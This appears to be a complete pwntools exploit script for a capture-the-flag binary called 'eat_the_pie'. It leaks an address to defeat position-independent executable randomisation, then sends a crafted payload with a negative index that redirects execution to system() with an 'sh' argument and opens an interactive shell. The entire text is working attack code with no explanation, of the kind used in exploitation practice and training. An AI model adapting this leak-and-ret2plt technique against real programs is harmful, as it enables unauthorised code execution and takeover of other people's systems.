from pwn import * 

p = process("./eat_the_pie")

offset = 0x74d
sh_offset = 0x31a
system_plt_offset = 0x5a0

payload = ""
payload += p32(0x35353535)
payload += "a"*4*3
p.sendlineafter(">",payload)
p.recvuntil("555a")

p.recv(11)
codebase = u32(p.recv(4))-offset

system_plt = codebase+system_plt_offset
sh = codebase+sh_offset
pppr = codebase + 0xa99

log.info(hex(codebase))

payload =""
payload += "-2"+"\x00"*2
payload += p32(system_plt)
payload += p32(pppr)
payload += p32(sh)

pause()
p.sendlineafter(">",payload)

p.interactive()
